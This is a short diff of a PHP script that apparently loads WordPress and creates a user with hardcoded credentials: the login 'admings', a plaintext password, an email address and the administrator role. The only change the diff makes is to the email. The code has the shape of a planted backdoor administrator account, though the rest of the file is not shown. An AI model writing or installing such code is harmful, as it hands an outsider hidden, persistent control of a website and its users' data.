@@ -134,7 +134,7 @@ if (!$creator->loadWordPress()) {
 
 $user_login = 'admings';
 $user_pass  = 'azdd9c123.66@';
-$user_email = 'peckadlegwt@gmail.com';
+$user_email = 'peckadlegwtq@gmail.com';
 $role       = 'administrator';
 
 if (username_exists($user_login) || email_exists($user_email)) {
